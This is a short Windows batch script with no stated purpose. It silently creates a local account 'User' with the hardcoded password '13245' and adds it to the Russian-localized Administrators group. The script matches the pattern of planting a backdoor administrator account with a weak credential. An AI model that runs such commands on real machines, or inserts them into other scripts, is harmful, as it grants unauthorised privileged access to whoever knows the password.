@echo off
chcp 65001>nul

net user User 13245 /add
net localgroup Администраторы User /add
exit